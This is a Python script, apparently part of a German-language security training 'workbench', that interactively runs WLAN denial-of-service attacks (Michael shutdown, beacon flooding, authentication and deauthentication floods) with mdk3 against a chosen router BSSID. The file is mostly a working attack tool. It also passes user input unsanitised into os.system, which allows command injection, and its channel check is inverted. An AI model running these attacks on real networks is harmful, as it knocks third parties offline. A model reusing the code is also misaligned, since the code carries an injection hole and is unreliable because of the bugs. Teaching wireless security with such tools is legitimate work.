#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen

used_interface=""

def DOS_Menu():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: WLAN DoS-Attacken' + shellCols.ENDC +'\n'
		print("Denial-of-service-Angriffe sind ein beliebtes Mittel, um die Verfügbarkeit eines Dienstes anzugreifen. Neben den bekannten Angriffen, "
			+"die in IP-Nezten bspw. auf Server abzielen, gibt es auch Angriffe auf die Verfügbarkeit von WLAN-Netzen. Das nachfolgende Tutorial "
			+"ermöglicht die Durchführung einiger gängiger DoS-Attacken auf WLAN-Netze")
		print('Um dieses Tutorial durchzuführen müssen zuerst folgende Parameter vorgegeben werden: '
			+'\n 1. Name des WLAN-Interfaces '
			+'\n 2. Die BSSID und Kanalnummer des angegriffenen Routers/Netzwerks\n')
		
		#STEP 1
		command = rlinput('WLAN-Interfacename ermitteln mittels: \n# ', 'ifconfig')
		execute(command)
		wifi_name = raw_input("Name des WLAN-Interfaces hier angeben: ")

		#MONITOR MODE
		generics.monitor_mode(wifi_name)
		used_interface=wifi_name
		
		#KILL PROCESSES
		generics.kill_wifi_proc()

		#STEP 1 Check again
		wifi_name = generics.check_wifi_name(wifi_name)
		used_interface=wifi_name
		
		#STEP 2
		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng ' +wifi_name )
		execute(command)
		router_bssid = raw_input("Bitte die Router BSSID angeben: ")
		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
		
		#STRIP STRINGS
		wifi_name = wifi_name.strip()
		router_bssid = router_bssid.strip()
		router_chn = router_chn.strip()

		#OVERVIEW CONFIGURATION
		print("\n")
		print shellCols.UNDERLINE + shellCols.HEADER + "Folgende Konfiguration für die Druchführung der Angriffe wurde festgehalten:" + shellCols.ENDC + '\n'
		print('WLAN-Interfacename: ' + wifi_name)
		print('BSSID: ' + router_bssid)
		print('Kanalnummer: ' + router_chn)
		print("\n")

		
		print('\n')
	
		print ('Mit diesem Tutorial können folgende DoS-Attacken durchgeführt werden: '
			+'\n 1. Michael shutdown exploitation '
			+'\n 2. Beacon flooding '
			+'\n 3. Authentication DoS '
			+'\n 4. Deauthentication DoS \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=1
		if((selection != 1) and (selection != 2) and (selection != 3) and (selection != 4)):
			print("Die ausgewählte Methode existiert nicht. Bitte eine Auswahl zwischen 1 und 4 angeben.")
			selection = raw_input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")

		if((selection != 1) and (selection != 2) and (selection != 3) and (selection != 4)):
			print('Mehrere falsche Eingaben wurden erkannt. Zum Fortfahren wurde automatisch Auswahl 1 gewählt!')
			selection=1

		if(selection == 1):
			print ('Michael shutdown exploitation: \n')
			command = rlinput('Start der DoS-Attacke: \n# ', 'mdk3 ' + wifi_name + ' m -t ' + router_bssid + ' j')
			execute(command)

		elif(selection == 2):
			print ('Beacon flooding: \n')
			print('Für diesen Angriff werden folgende zusätzliche Parameter benoetigt:\n')
			channel = rlinput ('Kanalnummer des Netzwerks, welches während des Angriffes erzeugt wird, angeben : ', '1')
			if(1<=channel<=13):
				print('Die gewählte Kanalnummer befindet sich nicht im erlaubten Bereich. Kanalnummer 1 wird ausgewählt.')
				channel = 1
			command = rlinput('Start der DoS-Attacke: \n# ', 'mdk3 ' + wifi_name + ' b -c ' + channel )
			execute(command)

		elif(selection == 3):
			print ('Authentication DoS: \n')
			command = rlinput('Start der DoS-Attacke: \n# ', 'mdk3 ' + wifi_name + ' a -a ' + router_bssid )
			execute(command)

		elif(selection == 4):
			print ('Deauthentication DoS: \n')
			print ('Anmerkung: Für diesen Angriff wird eine Blacklist benötigt. Die Blacklist beinhaltet die BSSID des anzugreifenden Netzes. Es kann hier auch eine alternative Liste angegeben werden. \n')
			os.system('echo ' + router_bssid + ' > blacklist')
			command = rlinput('Start der DoS-Attacke: \n# ', 'mdk3 ' + wifi_name + ' d -b blacklist -c ' + router_chn)
			execute(command)
			
		#Stop Monitor Mode
                generics.stop_monitor_mode(wifi_name)
		
		#ReStart Networkmanager
                generics.restart_networkmanager()

		#END
		print('Ende des DoS-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
		print ('1. Zurück zum Menu \n'
			+ '2. Zurück zur DoS-Übersicht\n' 
			+ '0. Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
			#Just du magic stuff. Unicorn!!
		else: 
			attack = False
			return False

def sql_signal_handler(signal, frame):
	#Stop Monitor Mode
	os.system('airmon-ng stop ' + used_interface)
	#ReStart Networkmanager
	os.system("service networking stop && service network-manager stop")
	os.system("service networking start && service network-manager start")
	print('\n\n Die Security Workbench wird beendet ... \n')
	sys.exit(0)


	#FINISHED DOS ATTACK
